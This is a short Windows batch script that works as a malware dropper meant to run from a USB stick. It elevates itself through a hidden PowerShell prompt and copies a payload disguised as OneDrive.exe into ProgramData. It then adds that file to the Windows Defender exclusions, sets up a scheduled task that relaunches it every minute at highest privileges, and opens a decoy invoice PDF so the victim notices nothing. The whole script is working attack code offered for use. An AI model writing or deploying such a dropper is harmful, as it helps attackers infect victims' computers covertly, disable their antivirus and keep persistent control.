@echo off
:: Elevate privileges if not running as administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit
)

:: Define payload destination
set "installPath=C:\ProgramData\OneDrive.exe"

:: Check if ProgramData exists, otherwise create it
if not exist "C:\ProgramData" mkdir "C:\ProgramData"

:: Move payload from USB to ProgramData
xcopy /y "%~dp0HiddenSystemFiles\OneDrive.exe" "%installPath%" >nul

:: Add to Windows Defender Exclusions
powershell -Command "Add-MpPreference -ExclusionPath '%installPath%'; Add-MpPreference -ExclusionProcess '%installPath%'"

:: Create a scheduled task for persistence
schtasks /create /tn "OneDriveUpdate" /tr "%installPath%" /sc MINUTE /mo 1 /rl HIGHEST /f

:: Start the payload immediately
start "" "%installPath%"

:: Open decoy PDF file
start "" "%~dp0Invoice.pdf"

:: Hide CMD window
exit
